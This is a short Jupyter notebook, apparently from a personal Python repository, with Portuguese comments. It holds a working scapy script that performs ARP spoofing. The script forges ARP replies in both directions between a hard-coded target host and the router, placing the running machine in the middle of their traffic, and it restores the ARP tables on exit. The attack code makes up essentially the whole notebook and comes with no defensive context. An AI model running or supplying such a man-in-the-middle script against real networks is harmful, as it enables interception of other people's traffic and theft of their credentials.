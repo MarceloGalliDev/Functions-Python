{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Necessario instalar o ncap antes > https://npcap.com/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import ARP, send, getmacbyip\n",
    "from time import sleep"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ip_alvo = \"192.168.1.108\"\n",
    "ip_roteador = \"192.168.1.1\"\n",
    "\n",
    "interface = \"wireless\"\n",
    "\n",
    "# se não entende de scapy básico, nem tente fazer para não dar merda, e se tentar não mude o código (só a variável interface)\n",
    "\n",
    "\n",
    "def spoof(ip_alvo, ip_roteador):\n",
    "    pacote = ARP(op=2, pdst=ip_roteador,\n",
    "                 hwdst=getmacbyip(ip_roteador), psrc=ip_alvo)\n",
    "    send(pacote, iface=interface, verbose=False)\n",
    "\n",
    "\n",
    "def restore(ip_alvo, ip_roteador):\n",
    "    pacote = ARP(op=2, pdst=ip_roteador, hwdst=getmacbyip(\n",
    "        ip_roteador), psrc=ip_alvo, hwsrc=getmacbyip(ip_alvo))\n",
    "    send(pacote, iface=interface, verbose=False)\n",
    "\n",
    "\n",
    "try:\n",
    "    while True:\n",
    "        spoof(ip_alvo, ip_roteador)\n",
    "        spoof(ip_roteador, ip_alvo)\n",
    "\n",
    "        print(f\"{ip_alvo} == me == {ip_roteador}\")\n",
    "\n",
    "        sleep(30)\n",
    "\n",
    "        restore(ip_alvo, ip_roteador)\n",
    "\n",
    "except KeyboardInterrupt:\n",
    "    restore(ip_alvo, ip_roteador)\n",
    "    restore(ip_roteador, ip_alvo)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
